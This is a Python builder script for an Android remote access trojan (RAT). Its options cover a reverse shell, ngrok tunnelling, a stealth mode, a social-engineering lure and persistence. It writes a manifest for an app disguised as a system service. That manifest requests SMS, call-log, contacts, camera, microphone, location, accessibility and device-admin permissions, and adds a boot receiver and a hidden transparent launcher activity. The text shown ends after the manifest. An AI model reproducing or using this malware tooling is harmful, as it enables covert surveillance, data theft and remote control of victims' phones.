#!/usr/bin/python
# -*- coding: utf-8 -*-

from utils import *
import argparse
import sys
import platform
try:
    from pyngrok import ngrok,conf
except ImportError as e:
    print(stdOutput("error")+"\033[1mpyngrok not found");
    print(stdOutput("info")+"\033[1mRun pip3 install -r requirements.txt")
    exit()
    
clearDirec()
#   _____   _                       _                         _____            _____   _____   ______    _____ 
#  |  __ \ | |                     | |                       |  __ \     /\    |_   _| |  __ \ |  ____|  |  __ \
#  | |__) || |__     __ _  _ __    | |_    ___  _ __ ___     | |__) |   /  \     | |   | |  | || |__     | |__) |
#  |  ___/ | '_ \   / _` | | '_ \  | __|  / _ \ | '_ ` _ \   |  _  /   / /\ \    | |   | |  | ||  __|    |  _  / 
#  | |     | | | | | (_| | | | | | | |_  | (_) || | | | | |  | | \ \  / ____ \  _| |_  | |__| || |____   | | \ \ 
#  |_|     |_| |_|  \__,_| |_| |_|  \__|  \___/ |_| |_| |_|  |_|  \_\/_/    \_\|_____| |_____/ |______|  |_|  \_\
#                                                                                             - By zannyphantom-13
#                                                                                             - Android 14-17 Compatible Version

parser = argparse.ArgumentParser(usage="%(prog)s [--build] [--shell] [-i <IP> -p <PORT> -o <apk name>]")
parser.add_argument('--build',help='For Building the apk',action='store_true')
parser.add_argument('--shell',help='For getting the Interpreter',action='store_true')
parser.add_argument('--ngrok',help='For using ngrok',action='store_true')
parser.add_argument('-i','--ip',metavar="<IP>" ,type=str,help='Enter the IP')
parser.add_argument('-p','--port',metavar="<Port>", type=str,help='Enter the Port')
parser.add_argument('-o','--output',metavar="<Apk Name>", type=str,help='Enter the apk Name')
parser.add_argument('-icon','--icon',help='Visible Icon',action='store_true')
parser.add_argument('--stealth',help='Enable maximum stealth mode',action='store_true')
parser.add_argument('--social',help='Create social engineering lure',action='store_true')
parser.add_argument('--persistence',help='Persistence method: workmanager|alarm|foreground', 
                    choices=['workmanager', 'alarm', 'foreground'], default='workmanager')
args = parser.parse_args()

def build(ip, port, output, ngrok_used, ngrok_port, icon, stealth=False, social=False, persistence='workmanager'):
    try:
        print(stdOutput("info") + "\033[1mBuilding Android 14-17 Compatible RAT...")
        
        # Create project structure
        project_dir = create_android_project(output, ip, port, stealth, social, persistence)
        
        # Handle icon if requested
        if icon:
            setup_icon(project_dir)
        
        # Configure for Android 14-17 compatibility
        configure_android_14_17(project_dir, stealth, social, persistence)
        
        # Build the APK
        build_apk(project_dir, output)
        
        print(stdOutput("success") + f"\033[1mAPK built successfully: {output}.apk")
        
        if social:
            print(stdOutput("info") + "\033[1mSocial engineering lure created in 'lure' directory")
        
        if ngrok_used:
            print(stdOutput("info") + f"\033[1mConnect to your RAT via: ngrok tcp {ngrok_port}")
        
        return True
    except Exception as e:
        print(stdOutput("error") + f"\033[1mBuild failed: {str(e)}")
        return False

def create_android_project(name, ip, port, stealth, social, persistence):
    print(stdOutput("info") + "\033[1mCreating Android project structure...")
    
    project_dir = f"projects/{name}"
    os.makedirs(project_dir, exist_ok=True)
    
    # Create basic Android structure
    os.makedirs(f"{project_dir}/app/src/main/java/com/system/services/core", exist_ok=True)
    os.makedirs(f"{project_dir}/app/src/main/res/layout", exist_ok=True)
    os.makedirs(f"{project_dir}/app/src/main/res/values", exist_ok=True)
    os.makedirs(f"{project_dir}/app/src/main/res/xml", exist_ok=True)
    os.makedirs(f"{project_dir}/app/src/main/res/drawable", exist_ok=True)
    
    # Create manifest with Android 14-17 permissions
    with open(f"{project_dir}/app/src/main/AndroidManifest.xml", "w") as f:
        f.write(f"""<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:tools="http://schemas.android.com/tools"
    package="com.system.services.core">

    <!-- Required permissions for Android 14-17 -->
    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
    <uses-permission android:name="android.permission.READ_SMS" />
    <uses-permission android:name="android.permission.RECEIVE_SMS" />
    <uses-permission android:name="android.permission.SEND_SMS" />
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
    <uses-permission android:name="android.permission.BIND_ACCESSIBILITY_SERVICE" />
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" 
        android:maxSdkVersion="28" />
    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
    <uses-permission android:name="android.permission.CAMERA" />
    <uses-permission android:name="android.permission.RECORD_AUDIO" />
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
    <uses-permission android:name="android.permission.GET_TASKS" 
        tools:ignore="ProtectedPermissions" />
    <uses-permission android:name="android.permission.PACKAGE_USAGE_STATS" 
        tools:ignore="ProtectedPermissions" />
    <uses-permission android:name="android.permission.DEVICE_ADMIN" />
    <uses-permission android:name="android.permission.WAKE_LOCK" />
    <uses-permission android:name="android.permission.DISABLE_KEYGUARD" />
    <uses-permission android:name="android.permission.READ_CALL_LOG" />
    <uses-permission android:name="android.permission.WRITE_CALL_LOG" />
    <uses-permission android:name="android.permission.READ_CONTACTS" />
    <uses-permission android:name="android.permission.WRITE_CONTACTS" />
    <uses-permission android:name="android.permission.CALL_PHONE" />
    <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS" />
    
    <!-- Android 13+ notification permission -->
    <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
    
    <!-- Android 12+ exact alarm permission -->
    <uses-permission android:name="android.permission.SCHEDULE_EXACT_ALARM" />
    
    <!-- Android 11+ package visibility -->
    <queries>
        <package android:name="com.android.settings" />
        <package android:name="com.google.android.apps.nbu.files" />
        <intent>
            <action android:name="android.intent.action.VIEW" />
            <data android:scheme="https" />
        </intent>
    </queries>

    <application
        android:allowBackup="true"
        android:icon="@mipmap/ic_launcher"
        android:label="@string/app_name"
        android:theme="@android:style/Theme.Translucent.NoTitleBar"
        android:hardwareAccelerated="true"
        android:requestLegacyExternalStorage="true"
        android:preserveLegacyExternalStorage="true"
        tools:targetApi="31">

        <!-- Main Service -->
        <service
            android:name=".MainService"
            android:enabled="true"
            android:exported="true"
            android:foregroundServiceType="dataSync|location|mediaPlayback" />

        <!-- Data Collector Service (Accessibility) -->
        <service
            android:name=".DataCollector"
            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
            android:exported="false">
            <intent-filter>
                <action android:name="android.accessibilityservice.AccessibilityService" />
            </intent-filter>
            <meta-data
                android:name="android.accessibilityservice"
                android:resource="@xml/accessibility_service_config" />
        </service>

        <!-- WorkManager Worker for persistence -->
        <service
            android:name="androidx.work.impl.foreground.SystemForegroundService"
            android:foregroundServiceType="dataSync" />

        <!-- Boot Receiver -->
        <receiver android:name=".BootReceiver">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED" />
                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
                <action android:name="com.htc.intent.action.QUICKBOOT_POWERON" />
            </intent-filter>
        </receiver>

        <!-- Device Admin Receiver -->
        <receiver
            android:name=".DeviceAdminReceiver"
            android:permission="android.permission.BIND_DEVICE_ADMIN">
            <meta-data
                android:name="android.app.device_admin"
                android:resource="@xml/device_admin" />
            <intent-filter>
                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
            </intent-filter>
        </receiver>

        <!-- Main Activity (transparent) -->
        <activity
            android:name=".MainActivity"
            android:theme="@android:style/Theme.Translucent.NoTitleBar"
            android:launchMode="singleTop"
            android:excludeFromRecents="true"
            android:configChanges="orientation|keyboardHidden|screenSize">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
    </application>
</manifest>
""")